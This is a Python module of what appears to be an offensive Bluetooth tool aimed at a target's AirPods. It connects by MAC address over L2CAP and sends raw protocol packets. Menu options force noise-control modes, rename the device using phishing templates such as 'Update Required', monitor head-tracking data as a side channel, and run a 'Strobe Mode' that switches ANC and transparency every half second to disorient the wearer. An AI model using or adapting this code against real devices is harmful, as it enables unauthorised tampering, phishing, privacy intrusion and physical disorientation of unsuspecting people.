import struct
import sys
import time
from rich.console import Console
from modules.reset import reset_adapter
from apybluez.apple.socket import AAPSocket
from apybluez.exceptions import AAPConnectionError

class ControlModule:
    def __init__(self, console=None, dev_id=0, target=None):
        self.console = console if console else Console()
        self.dev_id = dev_id
        self.target = target
        self.sock = None
        
    def log(self, msg):
        self.console.print(msg)

    def connect(self):
        if not self.target:
            self.log("[red][!] Target MAC address required for Control Mode.[/red]")
            return False
            
        self.log(f"[bold blue][*] Connecting to {self.target} via L2CAP (PSM 0x1001)...[/bold blue]")
        
        try:
            self.sock = AAPSocket()
            self.sock.connect((self.target, 0x1001))
            self.log("[green][+] Connected![/green]")
            return True
        except AAPConnectionError as e:
            self.log(f"[red][!] Connection failed: {e}[/red]")
            return False
        except Exception as e:
            self.log(f"[red][!] Unexpected error: {e}[/red]")
            return False

    def send_handshake(self):
        # AAPSocket handles handshake automatically on connect to 0x1001
        pass

    def set_noise_control(self, mode):
        header = b'\x04\x00\x04\x00'
        opcode = b'\x09\x00' 
        subcmd = b'\x0D' 
        mode_byte = bytes([mode])
        padding = b'\x00\x00\x00'
        
        packet = header + opcode + subcmd + mode_byte + padding
        
        try:
            self.sock.send(packet)
            modes = {1: "OFF", 2: "ANC", 3: "TRANSPARENCY"}
            self.log(f"[bold yellow][*] Sent Noise Control Command: {modes.get(mode, 'UNKNOWN')}[/bold yellow]")
        except Exception as e:
            self.log(f"[red][!] Failed to send command: {e}[/red]")

    def set_name(self, new_name):
        
        name_bytes = new_name.encode('utf-8')
        if len(name_bytes) > 64:
            self.log("[red][!] Name too long (max 64 chars).[/red]")
            return

        header = b'\x04\x00\x04\x00'
        opcode = b'\x1A\x00'
        length = bytes([len(name_bytes)])
        
        packet = header + opcode + length + name_bytes
        
        try:
            self.sock.send(packet)
            self.log(f"[bold red][*] Sent Rename Command: '{new_name}'[/bold red]")
            self.log("[dim]Note: This may require the user to open the case to take effect.[/dim]")
        except Exception as e:
            self.log(f"[red][!] Failed to send rename command: {e}[/red]")

    def monitor_head_tracking(self):
        self.log("[bold cyan][*] Monitoring Head Tracking Data... (Move head to see values)[/bold cyan]")
        self.log("[dim]Note: Requires spatial audio enabled/requested context[/dim]")
        try:
             while True:
                 data = self.sock.recv(255)
                 if len(data) > 4:
                     hex_data = data.hex()
                     self.log(f"[cyan]RX:[/cyan] {hex_data}")
        except KeyboardInterrupt:
             pass

    def strobe_mode(self):
        self.log("[bold red][!] STARTING STROBE MODE (ANC <-> TRANSPARENCY)[/bold red]")
        self.log("[dim]Press Ctrl+C to stop[/dim]")
        try:
            while True:
                self.set_noise_control(0x02) 
                time.sleep(0.5)
                self.set_noise_control(0x03) 
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.log("[yellow]Strobe stopped.[/yellow]")

    def start_control(self):
        reset_adapter(self.dev_id, self.console)
        if not self.connect():
            return
            
        self.send_handshake()
        time.sleep(1)
        
        self.log("\n[bold]Choose Action:[/bold]")
        self.log("1. Force Transparency (Hear Environment)")
        self.log("2. Force ANC (Silence)")
        self.log("3. Force Off (Normal)")
        self.log("4. [red]Phishing: Rename Device[/red]")
        self.log("5. [magenta]Side-Channel: Head Tracking Monitor[/magenta]")
        self.log("6. [red]Active: Strobe Mode (Disorient)[/red]")
        
        try:
            while True:
                choice = input("\naprpt-control > ")
                if choice == "1":
                    self.set_noise_control(0x03)
                elif choice == "2":
                    self.set_noise_control(0x02)
                elif choice == "3":
                    self.set_noise_control(0x01)
                elif choice == "4":
                    self.log("[yellow]Phishing Templates:[/yellow]")
                    self.log("  a) 'Connection Failed'")
                    self.log("  b) 'Update Required'")
                    self.log("  c) 'Not Your AirPods'")
                    self.log("  d) Custom Name")
                    sub = input("Select template/custom > ")
                    
                    target_name = ""
                    if sub == "a": target_name = "Connection Failed"
                    elif sub == "b": target_name = "Update Required"
                    elif sub == "c": target_name = "Not Your AirPods"
                    else: target_name = sub
                    
                    if target_name:
                        self.set_name(target_name)
                    
                elif choice == "5":
                    self.monitor_head_tracking()
                elif choice == "6":
                    self.strobe_mode()
                elif choice == "exit":
                    break
        except KeyboardInterrupt:
            pass
            
        self.log("[*] Closing connection...")
        self.sock.close()
